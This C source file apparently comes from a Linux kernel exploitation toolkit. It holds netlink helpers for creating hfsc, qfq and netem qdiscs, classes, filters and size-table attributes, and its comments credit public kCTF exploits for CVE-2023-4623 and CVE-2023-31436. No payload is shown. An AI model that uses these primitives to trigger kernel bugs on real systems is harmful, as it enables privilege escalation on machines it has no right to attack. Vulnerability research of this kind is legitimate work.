#include "net.h"
#define SIZE_SZ (sizeof(size_t))
#define chunksize(p) (*((size_t *)((char *)(p) - SIZE_SZ)) & ~0x7)
#define size_t unsigned long long 
#include <err.h>

/*
    lo interface up
*/
void loUp(void){
    int sock;
    struct ifreq ifr;

    // Open a socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Specify the interface (loopback in this case)
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);

    // Get current flags
    if (ioctl(sock, SIOCGIFFLAGS, &ifr) < 0) {
        perror("Getting interface flags failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Set the interface up
    ifr.ifr_flags |= IFF_UP;

    // Apply the new flags
    if (ioctl(sock, SIOCSIFFLAGS, &ifr) < 0) {
        perror("Setting interface up failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Close the socket
    close(sock);
    return ;
}
/*
    Functions from kCTF public exp cve-2023-4623:
*/

/*
 * Send a Netlink message and check for error
 */
void NLMsgSend (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    FAIL_IF(write(sock, m, m->nlh.nlmsg_len) == -1);
    FAIL_IF(read(sock , &ack, sizeof(ack)) == -1);
    FAIL_IF(ack.ne.error);
}
void NLMsgSend_noerr (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    FAIL_IF(write(sock, m, m->nlh.nlmsg_len) == -1);
    // FAIL_IF(read(sock , &ack, sizeof(ack)) == -1);
}
// void NLSendMsg(int sock, struct tf_msg *m){
//     info(hex(write(sock, m, m->nlh.nlmsg_len)));
// }
void NLSendMsg(int sock, struct tf_msg *m) {
    struct msghdr msg = {0};
    struct iovec iov[1];

    // Set up the message I/O vector
    iov[0].iov_base = m;  // Pointer to the message buffer
    iov[0].iov_len = m->nlh.nlmsg_len;  // Length of the message

    // Set up the msghdr (message header)
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    // Send the message using sendmsg syscall
    info(hex(sendmsg(sock, &msg, 0)));
}


int initNL(){
    /* Netlink message for setting loopback up. */
    struct if_msg if_up_msg = {
        {
            .nlmsg_len = 32,
            .nlmsg_type = RTM_NEWLINK,
            .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
        },
        {
            .ifi_family = AF_UNSPEC,
            .ifi_type = ARPHRD_NETROM,
            .ifi_index = 1,
            .ifi_flags = IFF_UP,
            .ifi_change = 1,
        },
    };
    // The code is doing `if lo up` and returns the nl_sock_fd
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    FAIL_IF(nl_sock_fd < 0);
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
    return nl_sock_fd;
}
/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopbackSend (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    FAIL_IF(inet_sock_fd < 0 );
    FAIL_IF(connect(inet_sock_fd, &iaddr, sizeof(iaddr)) < 0 );
    FAIL_IF(write(inet_sock_fd, "", 1) < 0);
    close(inet_sock_fd);
}
void markedLoopbackSend (u32 mark) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    FAIL_IF(inet_sock_fd < 0 );
    FAIL_IF(setsockopt(inet_sock_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark))< 0 );
    FAIL_IF(connect(inet_sock_fd, &iaddr, sizeof(iaddr)) < 0 );
    FAIL_IF(write(inet_sock_fd, "", 1) < 0);
    close(inet_sock_fd);
}

/* Trafic control for netlink */
void init_tf_msg (struct tf_msg *m) {
    // nlmsghdr
    m->nlh.nlmsg_len    = NLMSG_LENGTH(sizeof(m->tcm));
    m->nlh.nlmsg_type   = 0;    // Default Value
    // We need these flags since https://elixir.bootlin.com/linux/v6.11.8/source/net/netlink/af_netlink.c#L2540
    m->nlh.nlmsg_flags  = NLM_F_REQUEST | NLM_F_ACK; 
    m->nlh.nlmsg_seq    = 0;    // Default Value
    m->nlh.nlmsg_pid    = 0;    // Default Value

    // tcmsg
    m->tcm.tcm_family   = PF_UNSPEC;
    m->tcm.tcm_ifindex  = if_nametoindex("lo");
    m->tcm.tcm_handle   = 0;    // Default Value
    m->tcm.tcm_parent   = -1;   // Default Value for no parent
    m->tcm.tcm_info     = 0;    // Default Value
}

/* Helper functions for creating rtnetlink messages. */
unsigned short add_rtattr (unsigned long rta_addr, unsigned short type, unsigned short len, char *data) {
    struct rtattr *rta = (struct rtattr *)rta_addr;
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}
struct tf_msg * hfscQdiscAddImp(u32 handle,u32 parent,short defcls) {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    // Set TCA_OPTIONS for default class (https://elixir.bootlin.com/linux/v6.1.36/source/net/sched/sch_hfsc.c#L170)
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(defcls), (char *)&defcls));
    return m;
}
struct tf_msg * hfscQdiscAdd(short defcls) {
    return hfscQdiscAddImp(1<<16,-1,defcls);
}
struct tf_msg *qdiscDel(u32 handle) {
    // Allocate and initialize the message
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
    init_tf_msg(m);

    // Set message type and flags for deleting a qdisc
    m->nlh.nlmsg_type    = RTM_DELQDISC;     
    // m->nlh.nlmsg_flags   |; // No NLM_F_CREATE for deletion
    m->tcm.tcm_handle    = handle; // Handle identifier
    m->tcm.tcm_parent    = -1;      // Root qdisc
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    // Set TCA_OPTIONS for default class (https://elixir.bootlin.com/linux/v6.1.36/source/net/sched/sch_hfsc.c#L170)
    // Adjust the message length if needed, but no TCA_KIND for deletion
    return m;
}


struct tf_msg * hfscClassAdd(int type, u32 classid, u32 parentid){
    // Kernel Handler: function  hfsc_change_class
    /*
        hfsc_changeclass:
            - If the class exists, the function changes the attributes of the class
            - else, create a new class
    */
    /*
        parentid = 0 means q.root
    */
    FAIL_IF(type!=TCA_HFSC_RSC && type !=TCA_HFSC_FSC);
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = parentid;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    
    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);
    // Default trafic control policy
    // TODO: Get from parameters
    int dist[3] = {1, 1, 1}; 
    if(type == TCA_HFSC_RSC)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_HFSC_RSC, sizeof(dist), (char *)dist));
    else if(type == TCA_HFSC_FSC)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_HFSC_FSC, sizeof(dist), (char *)dist));

    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}


struct tf_msg * classDel(u32 classid){
    // Kernel Handler: function  hfsc_delete_class
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type        = RTM_DELTCLASS;
    m->tcm.tcm_handle        = classid;
    return m;
}



struct tf_msg * concatQdiscStab(struct tf_msg * m, char *data , u64 size, int overhead){
    // 0x3c for header
    // struct qdisc_size_table {
    // 	struct callback_head       rcu __attribute__((__aligned__(8))); /*     0  0x10 */
    // 	struct list_head           list;                 /*  0x10  0x10 */
    // 	struct tc_sizespec         szopts;               /*  0x20  0x18 */
    // 	int                        refcnt;               /*  0x38   0x4 */
    // 	u16                        data[];               /*  0x3c     0 */

    // 	/* size: 64, cachelines: 1, members: 5 */
    // 	/* padding: 4 */
    // 	/* forced alignments: 1 */
    // } __attribute__((__aligned__(8)));

    struct tc_sizespec ctx;
    memset(&ctx,0,sizeof(struct tc_sizespec));
    ctx.cell_log = 10;
    ctx.tsize    = size / sizeof(u16);
    ctx.overhead = overhead;
    // Expand the space
    m = realloc(m, sizeof(struct tf_msg) + sizeof(struct tc_sizespec)+0x200+size);
    
    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type          = TCA_STAB;
    opts->rta_len           = NLA_HDRLEN;


    opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_STAB_BASE, sizeof(struct tc_sizespec), (char *)&ctx));
    opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_STAB_DATA, size, data));
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);

    return m;
}
// Macro for default parameters
struct tf_msg *qfqQdiscChange(u32 handle, u32 parent) {
    // Allocate and initialize the tf_msg structure
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));

    init_tf_msg(m);

    // Set up the Netlink message
    m->nlh.nlmsg_type = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags |= NLM_F_REPLACE; // Change existing qdisc
    m->tcm.tcm_handle = handle;
    m->tcm.tcm_parent = parent;
    // Set TCA_KIND to "qfq"
    m->nlh.nlmsg_len += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));

    return m;
}

struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    return m;
}

struct tf_msg * qfqQdiscAddDef() {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = 1<<16;
    m->tcm.tcm_parent    = -1;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    return m;
}


struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
    FAIL_IF(type!=TCA_QFQ_LMAX && type!=TCA_QFQ_WEIGHT);
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = 0;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    
    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);
    
    if(type == TCA_QFQ_LMAX)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
    else if(type == TCA_QFQ_WEIGHT)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}

struct tf_msg *filterEdit(char *classifier_name, unsigned short prio, unsigned int flowid) {
    /*
    Due to the TCA_.*_CLASSID issue, this function only works TCA_.*_CLASSID == 1 
    */
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
    init_tf_msg(m); // Initialize the tf_msg structure
    m->nlh.nlmsg_type   = RTM_NEWTFILTER;
    m->nlh.nlmsg_flags  = NLM_F_REQUEST | NLM_F_ACK | NLM_F_REPLACE;
    m->tcm.tcm_info     = (prio << 16) | htons(ETH_P_IP); // Priority and protocol
    
    m->tcm.tcm_handle   = flowid;
    m->tcm.tcm_parent   = 0;

    // Add filter kind (e.g., rsvp)
    m->nlh.nlmsg_len += NLMSG_ALIGN(
        add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(classifier_name) + 1, classifier_name)
    );
     // Add TCA_OPTIONS for filter rules
    struct rtattr *opts = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);

    return m;
}
// The selector is required while adding a new filter

struct tf_msg *filterAdd(char * name, unsigned short prio, unsigned int flowid, struct schedAttr attrL[], size_t nr_attr) {
    /*
    Selector is required for u32
    Due to the TCA_.*_CLASSID issue, this function only works TCA_.*_CLASSID == 1 
    */

    struct tf_msg *m = calloc(1, sizeof(struct tf_msg)+0x4000);
    init_tf_msg(m); // Initialize the tf_msg structure
    m->nlh.nlmsg_type   = RTM_NEWTFILTER;
    m->nlh.nlmsg_flags |= NLM_F_CREATE ;
    m->tcm.tcm_info     = (prio << 16) | htons(ETH_P_IP); // Priority and protocol
    
    m->tcm.tcm_handle   = flowid;
    m->tcm.tcm_parent   = 0;

    // Add filter kind (e.g., rsvp)
    m->nlh.nlmsg_len += NLMSG_ALIGN(
        add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name)
    );

    if(attrL==0)
        return m;
    // Add TCA_OPTIONS for filter rules
    struct rtattr *opts = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    for( int i = 0 ; i < nr_attr ; i++ ){
        struct schedAttr * attr = &attrL[i];
        if(!attr)
            continue;
        opts->rta_len += RTA_ALIGN(
            add_rtattr((size_t)opts + RTA_ALIGN(opts->rta_len), attr->type, attr->size, attr->ctx)
        );
    }
    // Finalize the message length
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}

struct tf_msg * netemQdiscAdd(char *name,u32 handle, u32 parent, u32 usec) {
    // Learned from KCTF cve-2023-31436 write up
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle >> 16 << 16;
    m->tcm.tcm_parent    = parent;
    
    // Set TCA_KIND     
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name));

    // Add delay attribute to TCA_OPTIONS
    struct tc_netem_qopt qopt_attr={};
    qopt_attr.latency = 1000u * 1000 * 5000 * usec; // Delay in us
    qopt_attr.limit   = 1;
    m->nlh.nlmsg_len += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(qopt_attr), (char *)&qopt_attr));
    return m;
}




struct tf_msg * tempQdiscAdd(u32 handle,u32 parent,short defcls) {
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc 
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;
    
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(defcls), (char *)&defcls));
    return m;
}